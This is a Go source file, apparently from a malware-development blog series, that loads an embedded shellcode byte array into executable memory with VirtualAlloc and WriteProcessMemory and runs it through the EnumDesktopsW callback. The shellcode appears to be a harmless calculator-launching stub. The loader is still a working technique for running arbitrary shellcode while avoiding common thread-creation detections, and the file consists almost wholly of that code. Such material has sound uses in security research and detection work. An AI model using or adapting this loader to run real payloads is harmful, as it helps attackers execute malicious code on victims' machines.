package main

/*

Author: D3Ext
Blog post: https://d3ext.github.io/malware-dev-8/

*/

import (
  "fmt"
  "log"
  "time"
  "unsafe"

  "golang.org/x/sys/windows"
)

var shellcode = []byte{
  0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
  0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
  0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
  0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
  0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
  0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
  0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
  0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
  0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
  0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
  0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
  0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
  0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
  0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
  0xd7,
}

func main(){

  // Load DLLs
  user32 := windows.NewLazyDLL("user32.dll")
  kernel32 := windows.NewLazyDLL("kernel32.dll")

  // Import calls
  EnumDesktopsW := user32.NewProc("EnumDesktopsW")
  GetProcessWindowStation := user32.NewProc("GetProcessWindowStation")
  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")

  fmt.Println("Calling VirtualAlloc...")
  address, _, _ := VirtualAlloc.Call(
    0,
    uintptr(len(shellcode)),
    windows.MEM_COMMIT | windows.MEM_RESERVE,
    windows.PAGE_EXECUTE_READWRITE,
  )

  pHandle, _, _ := GetCurrentProcess.Call()
  size := uintptr(len(shellcode))

  fmt.Println("Calling WriteProcessMemory...")
  WriteProcessMemory.Call(
    pHandle,
    address,
    uintptr(unsafe.Pointer(&shellcode[0])),
    uintptr(unsafe.Pointer(&size)),
  )

  winProc, _, _ := GetProcessWindowStation.Call()
  fmt.Println("Calling EnumDesktopsW...")
  _, _, err := EnumDesktopsW.Call(winProc, address, 0)
  if err != nil {
    log.Fatal(err)
  }

  time.Sleep(10000 * time.Millisecond)
  fmt.Println("Success!")
}


